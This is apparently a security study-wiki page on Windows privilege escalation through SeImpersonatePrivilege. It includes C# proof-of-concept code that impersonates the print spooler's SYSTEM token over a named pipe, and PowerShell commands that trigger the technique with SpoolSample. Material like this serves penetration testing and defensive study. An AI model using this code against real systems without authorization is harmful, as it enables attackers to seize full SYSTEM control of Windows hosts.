---
title: Windows privilege escalation
tags:
  - breach
  - operations
  - windows
  - privilege
  - escalation
  - escalating
  - credentials
  - access
  - tokens
  - token
---

## SeImpersonatePrivilege

The **SeImpersonatePrivilege** privilege allows us to impersonate any token that
we can get a **HANDLE** to. Built-in accounts like **Network Service**, **Local
Service**, and the default IIS account have this privilege assigned by default.

A useful technique for privilege escalation is to invoke the
[DuplicateTokenEx](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
API to create a primary token from a user's impersonated token, allowing us to
create a new process in the context of the impersonated user. Alternatively,
when no tokens related to other users are available in process memory, we can
request the **SYSTEM** account to provide us a token we can use for
impersonation.

The [SharpGetSystem](https://github.com/fgsec/SharpGetSystem) proof of concept
demonstrates this using C#, installing the current console process as a service
and getting the service to connect to the named pipe, enabling the console
service to escalate to the SYSTEM account.

### Abusing the print spooler

The Windows print spooler process runs with the context of SYSTEM and monitors
printer object changes and sends change notifications to print client by
connecting to a client's named pipe. A process that has the
SeImpersonatePrivilege privilege can use the
[ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
to acquire an impersonation access token from the print spooler process after it
successfully establishes a connection to its named pipe.

Using the following C# .NET code shamelessly stolen from **SharpGetSystem**, we
can create a named pipe for the print spooler to connect to. Once a connection
is established, we'll use our SeImpersonatePrivilege privilege to impersonate
SYSTEM's access token, gather information about the token, and print the
SYSTEM's security identifier (SID):

```csharp
﻿using System.Runtime.InteropServices;

namespace Pwn
{
class Program
{
    public const uint SECURITY_SQOS_PRESENT = 0x00100000;
    public const uint SECURITY_ANONYMOUS = 0 << 16;
    public const uint SECURITY_IDENTIFICATION = 1 << 16;
    public const uint SECURITY_IMPERSONATION = 2 << 16;
    public const uint SECURITY_DELEGATION = 3 << 16;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        [MarshalAs(UnmanagedType.LPTStr)] string filename,
        [MarshalAs(UnmanagedType.U4)] FileAccess access,
        uint share,
        IntPtr securityAttributes,
        [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
        uint flagsAndAttributes,
        IntPtr templateFile
    );

    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Usage: Pwn.exe pipename");
            return;
        }

        string pipeName = args[0];

        // create a file for the named pipe
        IntPtr hfile = CreateFile(
            pipeName,
            FileAccess.Read,
            0,
            IntPtr.Zero,
            FileMode.Open,
            SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION |
                SECURITY_DELEGATION,
            IntPtr.Zero
        );

        // create a named pipe and block for inbound connections
        IntPtr hPipe = Pinvoke.CreateNamedPipe(
            pipeName,
            3,
            0,
            255,
            0x1000,
            0x1000,
            0,
            IntPtr.Zero
        );

        // wait for incoming pipe client
        Pinvoke.ConnectNamedPipe(hPipe, IntPtr.Zero);

        // impersonate pipe client's access token
        Pinvoke.ImpersonateNamedPipeClient(hPipe);

        // get a handle to this thread's access token
        IntPtr hToken;
        Pinvoke.OpenThreadToken(
            Pinvoke.GetCurrentThread(),
            0xF01FF,
            false,
            out hToken
        );

        // get access token information length
        Pinvoke.GetTokenInformation(
            hToken,
            1, // TOKEN_INFORMATION_CLASS == TokenUser
            IntPtr.Zero,
            0,
            out int TokenInfLength
        );

        // get access token information
        IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
        Pinvoke.GetTokenInformation(
            hToken,
            1,
            TokenInformation,
            TokenInfLength,
            out _
        );

        // get access token SID
        Pinvoke.TOKEN_USER TokenUser = (Pinvoke.TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(Pinvoke.TOKEN_USER));
        Pinvoke.ConvertSidToStringSid(TokenUser.User.Sid, out IntPtr pStr);
        string sSID = Marshal.PtrToStringAuto(pStr);
        Console.WriteLine(@"Found sid {0}", sSID);
    }
}
}
```

We compile and invoke `Pwn.exe` with the following:

```powershell
.\Pwn.exe \\.\pipe\test\pipe\spoolss
```

Using [SpoolSample](https://github.com/leechristensen/SpoolSample) we can get
the print spooler to establish a connection to our named pipe, enabling us to
impersonate the token. Invoke the following:

```powershell
.\SpoolSample.exe ${COMPUTERNAME} ${COMPUTERNAME}/pipe/test
```

After a couple of seconds, `Pwn.exe` should report the SID of SYSTEM!

## Related pages

- [[windows-credentials|Windows credentials]]
